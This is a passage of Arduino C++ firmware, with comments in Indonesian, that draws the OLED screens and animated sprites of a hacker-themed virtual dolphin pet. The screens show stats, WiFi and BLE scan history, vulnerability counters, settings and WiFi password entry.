  // Content area (y: 12-55)
  int contentY = 13;
  
  switch (currentStatsTab) {
    case TAB_GENERAL: {
      // General Stats
      display.setCursor(0, contentY);
      display.print(F("Stage: "));
      display.print(STAGE_NAMES[pet.stage]);
      display.print(F(" Lv"));
      display.print(pet.stage);
      
      display.setCursor(0, contentY + 10);
      display.print(F("XP: "));
      display.print(pet.xp);
      if (pet.stage < 7) {
        display.print(F("/"));
        display.print(XP_THRESHOLDS[pet.stage + 1]);
      }
      
      display.setCursor(0, contentY + 20);
      display.print(F("Age: "));
      display.print(pet.age);
      display.print(F(" days"));
      
      display.setCursor(70, contentY + 20);
      display.print(F("W: "));
      display.print(pet.weight);
      display.print(F("kg"));
      
      // XP Progress
      if (pet.stage < 7) {
        display.setCursor(0, contentY + 30);
        display.print(F("Next: "));
        display.print(STAGE_NAMES[pet.stage + 1]);
        
        int xpRange = XP_THRESHOLDS[pet.stage + 1] - XP_THRESHOLDS[pet.stage];
        int xpProgress = pet.xp - XP_THRESHOLDS[pet.stage];
        int percent = (xpProgress * 100) / max(1, xpRange);
        
        display.setCursor(70, contentY + 30);
        display.print(percent);
        display.print(F("%"));
        
        // Progress bar kecil
        display.drawRect(0, contentY + 40, 128, 6, SSD1306_WHITE);
        int barWidth = (percent * 126) / 100;
        display.fillRect(1, contentY + 41, barWidth, 4, SSD1306_WHITE);
      } else {
        display.setCursor(0, contentY + 30);
        display.print(F("MAX LEVEL ACHIEVED!"));
      }
      
      // Uptime
      display.setCursor(0, contentY + 50);
      display.print(F("Uptime: "));
      unsigned long hours = pet.uptime / 3600;
      if (hours > 0) {
        display.print(hours);
        display.print(F("h"));
      } else {
        display.print(pet.uptime / 60);
        display.print(F("m"));
      }
      break;
    }
      
    case TAB_NETWORK: {
      // Network Stats
      display.setCursor(0, contentY);
      display.print(F("WiFi Nets: "));
      display.print(pet.totalNetworks);
      
      display.setCursor(70, contentY);
      display.print(F("Devs: "));
      display.print(pet.totalDevices);
      
      display.setCursor(0, contentY + 10);
      display.print(F("Rare Devs: "));
      display.print(pet.rareDevices);
      
      display.setCursor(70, contentY + 10);
      display.print(F("BLE: "));
      display.print(pet.totalBLEDevices);
      
      // Last scan info
      if (historyCount > 0) {
        display.setCursor(0, contentY + 20);
        display.print(F("Last scan:"));
        unsigned long timeSince = (millis() - scanHistory[historyCount-1].timestamp) / 1000;
        display.setCursor(0, contentY + 30);
        
        if (timeSince < 60) {
          display.print(timeSince);
          display.print(F(" seconds ago"));
        } else if (timeSince < 3600) {
          display.print(timeSince / 60);
          display.print(F(" minutes ago"));
        } else {
          display.print(timeSince / 3600);
          display.print(F(" hours ago"));
        }
      }
      
      // Next scan
      display.setCursor(0, contentY + 40);
      display.print(F("Next WiFi: "));
      unsigned long nextWiFi = (nextWiFiScan > millis()) ? (nextWiFiScan - millis()) / 1000 : 0;
      if (nextWiFi > 0) {
        display.print(nextWiFi);
        display.print(F("s"));
      } else {
        display.print(F("Ready"));
      }
      
      display.setCursor(70, contentY + 40);
      display.print(F("BLE: "));
      unsigned long nextBLE = (nextBLEScan > millis()) ? (nextBLEScan - millis()) / 1000 : 0;
      if (nextBLE > 0) {
        display.print(nextBLE);
        display.print(F("s"));
      } else {
        display.print(F("Ready"));
      }
      
      // Scanning indicator
      if (wifiScanning || networkScanning) {
        display.setCursor(0, contentY + 50);
        display.print(F("WiFi Scanning..."));
      } else if (bleScanning) {
        display.setCursor(0, contentY + 50);
        display.print(F("BLE Scanning..."));
      }
      break;
    }
      
    case TAB_SECURITY: {
      // Security Stats
      display.setCursor(0, contentY);
      display.print(F("Vulnerabilities"));
      display.drawLine(0, contentY + 7, 80, contentY + 7, SSD1306_WHITE);
      
      display.setCursor(0, contentY + 12);
      display.print(F("Total: "));
      display.print(pet.vulnerableDevices);
      
      display.setCursor(70, contentY + 12);
      display.print(F("Crit: "));
      display.print(pet.criticalFinds);
      
      display.setCursor(0, contentY + 22);
      display.print(F("Verified: "));
      display.print(pet.verifiedVulns);
      
      // Risk indicator
      display.setCursor(0, contentY + 32);
      display.print(F("Risk Level:"));
      
      int riskScore = pet.criticalFinds * 10 + pet.verifiedVulns * 5;
      display.setCursor(70, contentY + 32);
      if (riskScore == 0) {
        display.print(F("LOW"));
        display.fillRect(110, contentY + 32, 3, 6, SSD1306_WHITE);
      } else if (riskScore < 20) {
        display.print(F("MED"));
        display.fillRect(110, contentY + 32, 6, 6, SSD1306_WHITE);
      } else if (riskScore < 50) {
        display.print(F("HIGH"));
        display.fillRect(110, contentY + 32, 9, 6, SSD1306_WHITE);
      } else {
        display.print(F("CRIT"));
        display.fillRect(110, contentY + 32, 12, 6, SSD1306_WHITE);
        if (animFrame % 2 == 0) {
          display.drawRect(109, contentY + 31, 14, 8, SSD1306_WHITE);
        }
      }
      
      // Most recent find
      if (historyCount > 0) {
        display.setCursor(0, contentY + 42);
        display.print(F("Last:"));
        
        int lastIdx = historyCount - 1;
        display.setCursor(0, contentY + 50);
        if (scanHistory[lastIdx].isBLEScan) {
          display.print(F("BLE "));
          display.print(scanHistory[lastIdx].bleDevices);
          display.print(F(" devs"));
        } else {
          String ssid = String(scanHistory[lastIdx].ssid);
          if (ssid.length() > 15) ssid = ssid.substring(0, 14) + ".";
          display.print(ssid);
        }
        
        display.setCursor(70, contentY + 50);
        display.print(F("+"));
        display.print(scanHistory[lastIdx].xpGained);
        display.print(F(" XP"));
      }
      break;
    }
      
    case TAB_STATUS: {
      // Status dengan mini bars
      display.setCursor(0, contentY);
      display.print(F("Dolphin Status"));
      display.drawLine(0, contentY + 7, 80, contentY + 7, SSD1306_WHITE);
      
      // Hunger
      display.setCursor(0, contentY + 12);
      display.print(F("H:"));
      drawCompactBar(12, contentY + 12, pet.hunger, 100);
      display.setCursor(70, contentY + 12);
      display.print(pet.hunger);
      display.print(F("%"));
      
      // Happiness
      display.setCursor(0, contentY + 22);
      display.print(F("J:"));
      drawCompactBar(12, contentY + 22, pet.happiness, 100);
      display.setCursor(70, contentY + 22);
      display.print(pet.happiness);
      display.print(F("%"));
      
      // Energy
      display.setCursor(0, contentY + 32);
      display.print(F("E:"));
      drawCompactBar(12, contentY + 32, pet.energy, 100);
      display.setCursor(70, contentY + 32);
      display.print(pet.energy);
      display.print(F("%"));
      
      // Mood
      display.setCursor(0, contentY + 42);
      if (pet.mood > 30) {
        display.print(F("M:"));
      } else if (pet.mood < -20) {
        display.print(F("A:"));
      } else {
        display.print(F("M:"));
      }
      drawCompactBar(12, contentY + 42, pet.mood + 100, 200);
      display.setCursor(70, contentY + 42);
      display.print(pet.mood);
      
      // Aggression
      if (pet.aggressionLevel > 30) {
        display.setCursor(0, contentY + 52);
        display.print(F("AG:"));
        drawCompactBar(12, contentY + 52, pet.aggressionLevel, 100);
        display.setCursor(70, contentY + 52);
        display.print(pet.aggressionLevel);
        display.print(F("%"));
        
        if (pet.aggressionLevel > 70) {
          display.fillRect(120, contentY + 52, 3, 6, SSD1306_WHITE);
          if (animFrame % 2 == 0) {
            display.drawRect(119, contentY + 51, 5, 8, SSD1306_WHITE);
          }
        }
      }
      break;
    }
  }
  
  // Footer navigation
  display.setCursor(0, 56);
  display.print(F("[< >]Tab [MENU]Back"));
}
  
void drawCompactBar(int x, int y, int value, int maxValue) {
  int barWidth = map(value, 0, maxValue, 0, 40);
  display.drawRect(x, y, 42, 6, SSD1306_WHITE);
  if (barWidth > 0) {
    display.fillRect(x + 1, y + 1, barWidth, 4, SSD1306_WHITE);
  }
}

void drawHistory() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(25, 0);
  display.print(F("HISTORY"));
  display.drawLine(0, 10, 127, 10, SSD1306_WHITE);
  
  if (historyCount == 0) {
    display.setCursor(20, 30);
    display.print(F("No scans yet"));
  } else {
    int maxDisplay = (historyCount < 4) ? historyCount : 4;
    for (int i = 0; i < maxDisplay; i++) {
      int idx = (historyScroll + i) % historyCount;
      display.setCursor(0, 13 + i*13);
      
      if (scanHistory[idx].isBLEScan) {
        display.print(F("BLE:"));
        display.print(scanHistory[idx].bleDevices);
        display.print(F(" "));
        display.print(scanHistory[idx].topVuln);
      } else {
        String ssid = String(scanHistory[idx].ssid);
        if (ssid.length() > 18) ssid = ssid.substring(0, 17) + ".";
        display.print(ssid);
      }
      
      display.setCursor(0, 13 + i*13 + 7);
      if (scanHistory[idx].isBLEScan) {
        display.print(F("  V:"));
        display.print(scanHistory[idx].vulnerableCount);
        if (scanHistory[idx].verifiedVulns > 0) {
          display.print(F(" VF:"));
          display.print(scanHistory[idx].verifiedVulns);
        }
      } else {
        display.print(F("  D:"));
        display.print(scanHistory[idx].deviceCount);
      }
      display.print(F(" XP:+"));
      display.print(scanHistory[idx].xpGained);
    }
  }
  
  display.setCursor(0, 56);
  display.print(F("[^v] [MENU]Back"));
}

void drawSettings() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(25, 0);
  display.print(F("SETTINGS"));
  display.drawLine(0, 10, 127, 10, SSD1306_WHITE);
  
  display.setCursor(0, 14);
  display.print(F("Sleep: "));
  display.print(settings.sleepEnabled ? F("ON") : F("OFF"));
  display.print(F(" "));
  display.print(settings.sleepStart);
  display.print(F("-"));
  display.print(settings.sleepEnd);
  
  display.setCursor(0, 24);
  display.print(F("Scan: "));
  display.print(settings.scanInterval);
  display.print(F("m "));
  display.print(settings.aggressiveScan ? F("AGGRO") : F("NORM"));
  
  display.setCursor(0, 34);
  display.print(F("BLE:"));
  display.print(settings.bleEnabled ? F("ON") : F("OFF"));
  display.print(F(" T:"));
  display.print(settings.bleScanTime);
  display.print(F("s"));
  
  display.setCursor(0, 44);
  display.print(F("Probe:"));
  display.print(settings.activeProbe ? F("ON") : F("OFF"));
  display.print(F(" Beep:"));
  display.print(settings.beepEnabled ? F("ON") : F("OFF"));
  
  // TAMBAH SETTINGS MOOD
  display.setCursor(0, 54);
  display.print(F("Mood:"));
  display.print(settings.moodEnabled ? F("ON") : F("OFF"));
  display.print(F(" Thr:"));
  display.print(settings.moodAggressionThreshold);
  
  display.setCursor(0, 56);
  display.print(F("[MENU] Back"));
}

static int wifiSetupScroll = 0;

void drawWiFiSetup() {
  display.clearDisplay();
  display.setTextSize(1);
  
  display.setCursor(20, 0);
  display.print(F("WIFI SETUP"));
  display.drawLine(0, 10, 127, 10, SSD1306_WHITE);
  
  if (wifiCreds.hasSaved) {
    String ssidStr = String(wifiCreds.ssid);
    String ourMac = WiFi.macAddress();
    String shortOurMac = ourMac;
    
    if (wifiSetupPage == 0) {
      // Halaman 1: Info jaringan tersimpan
      display.setCursor(0, 15);
      display.print(F("Saved Network:"));
      
      display.setCursor(6, 28);
      if (ssidStr.length() > 20) {
        display.print(ssidStr.substring(0, 19) + ".");
      } else {
        display.print(ssidStr);
      }
      
      display.setCursor(0, 42);
      display.print(F("Our MAC:"));
      display.setCursor(6, 54);
      display.print(shortOurMac);
      
      // Panah ke bawah (ada halaman berikutnya)
      display.setCursor(118, 56);
      display.print(F("v"));
      
    } else {
      // Halaman 2: Instruksi tombol
      display.setCursor(5, 15);
      display.print(F("[OK]  Scan Networks"));
      
      display.setCursor(5, 28);
      display.print(F("[UP]  Clear Saved WiFi"));
      
      display.setCursor(5, 41);
      display.print(F("[MENU] Back to Menu"));
      
      display.setCursor(5, 54);
      display.print(F("[v ^] Change Page"));
      
      // Panah ke atas (bisa balik ke halaman sebelumnya)
      display.setCursor(118, 10);
      display.print(F("^"));
    }
    
  } else {
    // Tidak ada WiFi tersimpan
    display.setCursor(15, 20);
    display.print(F("No WiFi saved"));
    
    display.setCursor(5, 35);
    display.print(F("[OK] Scan Networks"));
    
    String shortOurMac = WiFi.macAddress();
    display.setCursor(6, 50);
    display.print(shortOurMac);
  }
}

void drawWiFiSelector() {
  display.clearDisplay();
  display.setTextSize(1);
  
  display.setCursor(20, 0);
  display.print(F("Select Network"));
  display.setCursor(105, 0);
  display.print(wifiSelectorIndex + 1);
  display.print(F("/"));
  display.print(wifiNetworkCount);
  
  if (wifiNetworkCount == 0) {
    display.setCursor(25, 28);
    display.print(F("Scanning..."));
    return;
  }
  
  int maxDisplay = 2;
  
  for (int i = 0; i < maxDisplay; i++) {
    int idx = wifiSelectorScroll + i;
    if (idx >= wifiNetworkCount) break;
    
    int yStart = 10 + (i * 27);
    
    if (idx == wifiSelectorIndex) {
      display.fillRoundRect(2, yStart, 124, 25, 4, SSD1306_WHITE);
      display.fillRoundRect(4, yStart + 2, 120, 21, 3, SSD1306_BLACK);
      display.drawRoundRect(3, yStart + 1, 122, 23, 3, SSD1306_WHITE);
    } else {
      display.drawRoundRect(2, yStart, 124, 25, 4, SSD1306_WHITE);
    }
    
    display.setCursor(8, yStart + 4);
    String ssid = wifiNetworks[idx].ssid;
    if (ssid.length() > 16) ssid = ssid.substring(0, 15) + ".";
    display.print(ssid);
    
    if (!wifiNetworks[idx].isOpen) {
      display.fillRect(108, yStart + 3, 14, 9, SSD1306_WHITE);
      display.setCursor(110, yStart + 4);
      display.setTextColor(SSD1306_BLACK);
      display.print(F("L"));
      display.setTextColor(SSD1306_WHITE);
    }
    
    display.setCursor(8, yStart + 15);
    
    int rssi = wifiNetworks[idx].rssi;
    if (rssi > -50) display.print(F("Strong"));
    else if (rssi > -60) display.print(F("Good"));
    else if (rssi > -70) display.print(F("Weak"));
    else display.print(F("Poor"));
    
    display.print(F(" | "));
    
    String mac = wifiNetworks[idx].macAddress;
    if (mac.length() >= 8) {
      display.print(mac.substring(mac.length() - 8));
    }
  }
  
  display.drawLine(0, 8, 127, 8, SSD1306_WHITE);
  
  if (wifiSelectorScroll > 0) {
    display.fillCircle(64, 9, 2, SSD1306_WHITE);
    display.drawPixel(64, 7, SSD1306_WHITE);
  }
  
  if (wifiSelectorScroll + maxDisplay < wifiNetworkCount) {
    display.fillCircle(64, 62, 2, SSD1306_WHITE);
    display.drawPixel(64, 64, SSD1306_WHITE);
  }
}

void drawWiFiPasswordInput() {
  display.clearDisplay();
  display.setTextSize(1);
  
  display.setCursor(10, 0);
  display.print(F("ENTER PASSWORD"));
  display.drawLine(0, 10, 127, 10, SSD1306_WHITE);
  
  display.setCursor(0, 13);
  display.print(F("SSID: "));
  String ssid = wifiNetworks[wifiSelectorIndex].ssid;
  if (ssid.length() > 15) ssid = ssid.substring(0, 14) + ".";
  display.print(ssid);
  
  display.setCursor(0, 23);
  display.print(F("Pass: "));
  if (passwordLen > 0) {
    for (int i = 0; i < passwordLen && i < 15; i++) {
      display.print(F("*"));
    }
  } else {
    display.print(F("_"));
  }
  
  int startY = 33;
  
  for (int row = -1; row <= 1; row++) {
    int currentRow = keyboardY + row;
    if (currentRow < 0 || currentRow >= KEYBOARD_ROWS) continue;
    
    int yPos = startY + (row + 1) * 8;
    
    for (int col = 0; col < 6; col++) {
      int currentCol = keyboardX - 2 + col;
      if (currentCol < 0 || currentCol >= KEYBOARD_COLS) continue;
      
      int idx = currentRow * KEYBOARD_COLS + currentCol;
      if (idx >= 0 && idx < (int)strlen(KEYBOARD_CHARS)) {
        int xPos = 20 + col * 15;
        
        if (currentRow == keyboardY && currentCol == keyboardX) {
          display.fillRect(xPos - 2, yPos - 1, 10, 9, SSD1306_WHITE);
          display.setTextColor(SSD1306_BLACK);
        }
        
        display.setCursor(xPos, yPos);
        display.print(KEYBOARD_CHARS[idx]);
        
        display.setTextColor(SSD1306_WHITE);
      }
    }
  }
  
  display.setCursor(0, 56);
  display.print(F("[^v][OK][MENU]Del"));
}

void drawWiFiConnecting() {
  display.clearDisplay();
  display.setTextSize(1);
  
  display.setCursor(20, 15);
  display.print(F("Connecting"));
  
  display.setCursor(35, 28);
  for (int i = 0; i < (animFrame % 4); i++) {
    display.print(F("."));
  }
  
  display.setCursor(10, 45);
  String ssid = wifiNetworks[wifiSelectorIndex].ssid;
  if (ssid.length() > 18) ssid = ssid.substring(0, 17) + ".";
  display.print(ssid);
}
void drawDolphin(int x, int y, int stage, PetAction action, int frame) {
  switch (stage) {
    case 0: drawEgg(x, y, frame); break;
    case 1: drawHatchling(x, y, action, frame); break;
    case 2: drawBaby(x, y, action, frame); break;
    case 3: drawYoung(x, y, action, frame); break;
    case 4: drawTeen(x, y, action, frame); break;
    case 5: drawAdult(x, y, action, frame); break;
    case 6: drawElder(x, y, action, frame); break;
    case 7: drawCyber(x, y, action, frame); break;
  }
}

void drawEgg(int x, int y, int frame) {
  int breathe = (frame % 4 < 2) ? 0 : 1;
  display.fillCircle(x, y + breathe, 12, SSD1306_WHITE);
  display.fillCircle(x, y - 7 + breathe, 10, SSD1306_WHITE);
  display.fillCircle(x - 4, y - 3 + breathe, 2, SSD1306_BLACK);
  display.fillCircle(x + 4, y + 2 + breathe, 2, SSD1306_BLACK);
  display.fillCircle(x, y - 8 + breathe, 1, SSD1306_BLACK);
  
  if (frame == 0 || frame == 1) {
    display.drawLine(x - 11, y + breathe, x - 13, y + breathe, SSD1306_WHITE);
  } else {
    display.drawLine(x + 11, y + breathe, x + 13, y + breathe, SSD1306_WHITE);
  }
  
  if (pet.xp > 30) display.drawLine(x - 3, y - 9 + breathe, x - 6, y - 5 + breathe, SSD1306_BLACK);
  if (pet.xp > 60) {
    display.drawLine(x - 6, y - 5 + breathe, x - 4, y - 1 + breathe, SSD1306_BLACK);
    display.drawLine(x + 2, y - 8 + breathe, x + 4, y - 4 + breathe, SSD1306_BLACK);
  }
  if (pet.xp > 80) display.drawLine(x, y + 8 + breathe, x + 2, y + 10 + breathe, SSD1306_BLACK);
}

void drawHatchling(int x, int y, PetAction action, int frame) {
  int yOffset = 0;
  if (action == ACTION_JUMPING) {
    int jumpSeq[] = {0, -2, -4, -5, -4, -2, 0};
    yOffset = jumpSeq[frame % 7];
  } else {
    yOffset = (frame % 4 < 2) ? 0 : -1;
  }
  y += yOffset;
  
  display.fillRoundRect(x - 7, y - 3, 14, 7, 3, SSD1306_WHITE);
  display.fillCircle(x, y - 8, 6, SSD1306_WHITE);
  display.fillCircle(x - 1, y - 5, 2, SSD1306_WHITE);
  
  if (isBlinking || action == ACTION_SLEEPING) {
    display.drawLine(x - 3, y - 8, x - 2, y - 8, SSD1306_BLACK);
    display.drawLine(x + 2, y - 8, x + 3, y - 8, SSD1306_BLACK);
  } else if (action == ACTION_HAPPY || action == ACTION_EATING || action == ACTION_CELEBRATING) {
    display.fillCircle(x - 3, y - 9, 1, SSD1306_BLACK);
    display.drawPixel(x - 2, y - 8, SSD1306_BLACK);
    display.fillCircle(x + 3, y - 9, 1, SSD1306_BLACK);
    display.drawPixel(x + 2, y - 8, SSD1306_BLACK);
  } else {
    display.fillCircle(x - 3, y - 8, 1, SSD1306_BLACK);
    display.fillCircle(x + 3, y - 8, 1, SSD1306_BLACK);
  }
  
  if (action == ACTION_EATING) {
    display.fillCircle(x - 2, y - 6, 2, SSD1306_BLACK);
    if (frame % 2 == 0) display.drawPixel(x - 5, y - 4, SSD1306_WHITE);
  } else if (action == ACTION_HAPPY || action == ACTION_CELEBRATING) {
    display.drawLine(x - 2, y - 5, x + 1, y - 5, SSD1306_BLACK);
  } else {
    display.drawPixel(x - 1, y - 6, SSD1306_BLACK);
  }
  
  int tailPhase = frame % 4;
  for (int i = 0; i < 4; i++) {
    int wave = ((tailPhase + i) % 4 < 2) ? 1 : -1;
    display.drawPixel(x + 7 + i, y + wave, SSD1306_WHITE);
  }
  
  display.fillRect(x - 6, y + 3, 2, 2, SSD1306_WHITE);
  display.fillRect(x + 4, y + 3, 2, 2, SSD1306_WHITE);
  
  if (action == ACTION_SCANNING || action == ACTION_BLE_SCAN || action == ACTION_ATTACKING) {
    drawScanWaves(x, y - 8, action == ACTION_BLE_SCAN || action == ACTION_ATTACKING);
  }
  
  if (action == ACTION_CELEBRATING) {
    if (frame % 2 == 0) {
      display.drawPixel(x - 10, y - 10, SSD1306_WHITE);
      display.drawPixel(x + 10, y - 10, SSD1306_WHITE);
      display.drawPixel(x - 8, y + 5, SSD1306_WHITE);
      display.drawPixel(x + 8, y + 5, SSD1306_WHITE);
    }
  }
}

void drawBaby(int x, int y, PetAction action, int frame) {
  int yOffset = 0;
  if (action == ACTION_JUMPING) {
    int jumpSeq[] = {0, -3, -5, -6, -5, -3, 0};
    yOffset = jumpSeq[frame % 7];
  } else {
    yOffset = (frame % 4 < 2) ? 0 : -1;
  }
  y += yOffset;
  
  display.fillRoundRect(x - 9, y - 4, 18, 9, 4, SSD1306_WHITE);
  display.fillCircle(x - 3, y - 10, 7, SSD1306_WHITE);
  display.fillCircle(x - 6, y - 9, 4, SSD1306_WHITE);
  
  if (isBlinking || action == ACTION_SLEEPING) {
    display.drawLine(x - 6, y - 10, x - 5, y - 10, SSD1306_BLACK);
    display.drawLine(x - 1, y - 10, x, y - 10, SSD1306_BLACK);
  } else if (action == ACTION_HAPPY || action == ACTION_CELEBRATING) {
    display.drawLine(x - 7, y - 11, x - 6, y - 10, SSD1306_BLACK);
    display.drawLine(x - 6, y - 10, x - 5, y - 11, SSD1306_BLACK);
    display.drawLine(x - 2, y - 11, x - 1, y - 10, SSD1306_BLACK);
    display.drawLine(x - 1, y - 10, x, y - 11, SSD1306_BLACK);
  } else {
    display.fillCircle(x - 6, y - 10, 1, SSD1306_BLACK);
    display.fillCircle(x - 1, y - 10, 1, SSD1306_BLACK);
  }
  
  if (action == ACTION_EATING) {
    display.fillCircle(x - 7, y - 8, 2, SSD1306_BLACK);
    if (frame % 2 == 0) display.fillRect(x - 11, y - 6, 2, 2, SSD1306_WHITE);
  } else if (action == ACTION_HAPPY || action == ACTION_CELEBRATING) {
    display.drawLine(x - 7, y - 8, x - 5, y - 7, SSD1306_BLACK);
  } else {
    display.drawLine(x - 7, y - 8, x - 6, y - 8, SSD1306_BLACK);
  }
  
  int tailX = x + 9;
  for (int i = 0; i < 5; i++) {
    int wave = ((frame + i) % 4 < 2) ? -1 : 1;
    int waveStrength = (i < 3) ? 1 : 2;
    display.drawPixel(tailX + i, y + wave * waveStrength, SSD1306_WHITE);
  }
  display.drawLine(tailX + 4, y - 2, tailX + 6, y, SSD1306_WHITE);
  display.drawLine(tailX + 4, y + 2, tailX + 6, y, SSD1306_WHITE);
  
  int flipOffset = (frame % 4 < 2) ? 0 : 1;
  display.fillRect(x - 8, y + 4 + flipOffset, 3, 2, SSD1306_WHITE);
  display.fillRect(x + 5, y + 4 + flipOffset, 3, 2, SSD1306_WHITE);
  
  if (action == ACTION_SCANNING || action == ACTION_BLE_SCAN || action == ACTION_ATTACKING) {
    drawScanWaves(x - 6, y - 9, action == ACTION_BLE_SCAN || action == ACTION_ATTACKING);
  }
  
  if (action == ACTION_CELEBRATING) {
    for (int i = 0; i < 3; i++) {
      if ((frame + i) % 3 == 0) {
        display.drawPixel(x - 12 + i * 3, y - 12, SSD1306_WHITE);
        display.drawPixel(x + 8 + i * 2, y - 8, SSD1306_WHITE);
      }
    }
  }
  if (pet.mood < -30) {
    // Efek mata marah
    if (isBlinking) {
      // Normal blinking
    } else {
      // Mata menyipit/marah
      display.drawLine(x - 6, y - 10, x - 5, y - 9, SSD1306_BLACK);
      display.drawLine(x - 1, y - 10, x, y - 9, SSD1306_BLACK);
    }
    
    // Efek mulut marah
    if (animFrame % 3 == 0) {
      display.drawLine(x - 7, y - 8, x - 6, y - 8, SSD1306_BLACK);
      display.drawLine(x - 6, y - 8, x - 5, y - 7, SSD1306_BLACK);
    }
  }

  if (pet.isAngry && pet.aggressionLevel > 70) {
    // Efek "steam" dari kepala
    if (animFrame % 2 == 0) {
      for (int i = 0; i < 2; i++) {
        int steamX = x - 8 + random(0, 16);
        int steamY = y - 15 - random(0, 5);
        display.drawPixel(steamX, steamY, SSD1306_WHITE);
      }
    }
  }
}

void drawYoung(int x, int y, PetAction action, int frame) {
  int yOffset = 0;
  if (action == ACTION_JUMPING) {
    int jumpSeq[] = {0, -4, -7, -8, -7, -4, 0};
    yOffset = jumpSeq[frame % 7];
  } else {
    yOffset = (frame % 4 < 2) ? 0 : -1;
  }
  y += yOffset;
  
  display.fillRoundRect(x - 11, y - 5, 22, 11, 5, SSD1306_WHITE);
  display.fillCircle(x - 4, y - 12, 8, SSD1306_WHITE);
  display.fillCircle(x - 8, y - 11, 5, SSD1306_WHITE);
  
  if (isBlinking || action == ACTION_SLEEPING) {
    display.drawLine(x - 7, y - 12, x - 5, y - 12, SSD1306_BLACK);
    display.drawLine(x - 2, y - 12, x, y - 12, SSD1306_BLACK);
  } else if (action == ACTION_HAPPY || action == ACTION_CELEBRATING) {
    display.drawLine(x - 8, y - 13, x - 7, y - 12, SSD1306_BLACK);
    display.drawLine(x - 7, y - 12, x - 6, y - 13, SSD1306_BLACK);
    display.drawLine(x - 2, y - 13, x - 1, y - 12, SSD1306_BLACK);
    display.drawLine(x - 1, y - 12, x, y - 13, SSD1306_BLACK);
  } else {
    display.fillCircle(x - 7, y - 12, 1, SSD1306_BLACK);
    display.fillCircle(x - 1, y - 12, 1, SSD1306_BLACK);
  }
  
  if (action == ACTION_HAPPY || action == ACTION_CELEBRATING) {
    display.drawLine(x - 9, y - 10, x - 7, y - 9, SSD1306_BLACK);
  } else {
    display.drawLine(x - 9, y - 10, x - 8, y - 10, SSD1306_BLACK);
  }
  
  display.fillTriangle(x - 1, y - 14, x - 3, y - 6, x + 1, y - 6, SSD1306_WHITE);
  
  int tailX = x + 11;
  for (int i = 0; i < 7; i++) {
    int wave = ((frame + i) % 4 < 2) ? -2 : 2;
    display.drawPixel(tailX + i, y + wave, SSD1306_WHITE);
  }
  display.drawLine(tailX + 5, y - 3, tailX + 7, y, SSD1306_WHITE);
  display.drawLine(tailX + 5, y + 3, tailX + 7, y, SSD1306_WHITE);
  
  int flipOffset = (frame % 4 < 2) ? 0 : 1;
  display.fillRect(x - 10, y + 5 + flipOffset, 4, 2, SSD1306_WHITE);
  display.fillRect(x + 6, y + 5 + flipOffset, 4, 2, SSD1306_WHITE);
  
  if (action == ACTION_SCANNING || action == ACTION_BLE_SCAN || action == ACTION_ATTACKING) {
    drawScanWaves(x - 8, y - 11, action == ACTION_BLE_SCAN || action == ACTION_ATTACKING);
  }
  if (pet.mood < -30) {
    // Efek mata marah
    if (isBlinking) {
      // Normal blinking
    } else {
      // Mata menyipit/marah
      display.drawLine(x - 6, y - 10, x - 5, y - 9, SSD1306_BLACK);
      display.drawLine(x - 1, y - 10, x, y - 9, SSD1306_BLACK);
    }
    
    // Efek mulut marah
    if (animFrame % 3 == 0) {
      display.drawLine(x - 7, y - 8, x - 6, y - 8, SSD1306_BLACK);
      display.drawLine(x - 6, y - 8, x - 5, y - 7, SSD1306_BLACK);
    }
  }

  if (pet.isAngry && pet.aggressionLevel > 70) {
    // Efek "steam" dari kepala
    if (animFrame % 2 == 0) {
      for (int i = 0; i < 2; i++) {
        int steamX = x - 8 + random(0, 16);
        int steamY = y - 15 - random(0, 5);
        display.drawPixel(steamX, steamY, SSD1306_WHITE);
      }
    }
  }
}

void drawTeen(int x, int y, PetAction action, int frame) {
  drawYoung(x, y, action, frame);
  display.fillTriangle(x - 1, y - 16, x - 4, y - 6, x + 2, y - 6, SSD1306_WHITE);
  display.drawLine(x - 2, y - 14, x - 1, y - 8, SSD1306_BLACK);
}

void drawAdult(int x, int y, PetAction action, int frame) {
  drawYoung(x, y, action, frame);
  display.fillTriangle(x - 1, y - 18, x - 5, y - 6, x + 3, y - 6, SSD1306_WHITE);
  display.drawLine(x - 2, y - 16, x - 1, y - 8, SSD1306_BLACK);
  display.drawLine(x - 11, y - 5, x - 8, y - 10, SSD1306_BLACK);
}

void drawElder(int x, int y, PetAction action, int frame) {
  drawAdult(x, y, action, frame);
  display.drawLine(x - 9, y - 13, x - 8, y - 13, SSD1306_BLACK);
  display.drawLine(x - 10, y - 11, x - 9, y - 11, SSD1306_BLACK);
  if (frame % 2 == 0) {
    display.drawPixel(x - 8, y - 2, SSD1306_BLACK);
    display.drawPixel(x - 4, y + 2, SSD1306_BLACK);
    display.drawPixel(x + 2, y - 1, SSD1306_BLACK);
  }
}

void drawCyber(int x, int y, PetAction action, int frame) {
  drawAdult(x, y, action, frame);
  
  display.fillRect(x - 8, y - 13, 2, 2, SSD1306_WHITE);
  display.drawRect(x - 9, y - 14, 4, 4, SSD1306_WHITE);
  display.fillRect(x - 2, y - 13, 2, 2, SSD1306_WHITE);
  display.drawRect(x - 3, y - 14, 4, 4, SSD1306_WHITE);
  
  if (frame % 2 == 0) {
    display.drawLine(x - 6, y - 4, x - 3, y - 4, SSD1306_BLACK);
    display.drawPixel(x - 5, y - 3, SSD1306_BLACK);
    display.drawPixel(x - 4, y - 2, SSD1306_BLACK);
  }
  
  int particles[][2] = {{-13, -8}, {-14, 0}, {13, -5}, {12, 3}};
  for (int i = 0; i < 4; i++) {
    if ((frame + i) % 4 == 0) {
      display.drawPixel(x + particles[i][0], y + particles[i][1], SSD1306_WHITE);
    }
  }
  
  if (action == ACTION_SCANNING || action == ACTION_BLE_SCAN || action == ACTION_ATTACKING) {
    for (int i = 0; i < 3; i++) {
      int streamY = y - 15 + ((frame + i * 2) % 12);
      display.drawPixel(x + 15 + i, streamY, SSD1306_WHITE);
    }
  }
  if (pet.mood < -30) {
    // Efek mata marah
    if (isBlinking) {
      // Normal blinking
    } else {
      // Mata menyipit/marah
      display.drawLine(x - 6, y - 10, x - 5, y - 9, SSD1306_BLACK);
      display.drawLine(x - 1, y - 10, x, y - 9, SSD1306_BLACK);
    }
    
    // Efek mulut marah
    if (animFrame % 3 == 0) {
      display.drawLine(x - 7, y - 8, x - 6, y - 8, SSD1306_BLACK);
      display.drawLine(x - 6, y - 8, x - 5, y - 7, SSD1306_BLACK);
    }
  }

  if (pet.isAngry && pet.aggressionLevel > 70) {
    // Efek "steam" dari kepala
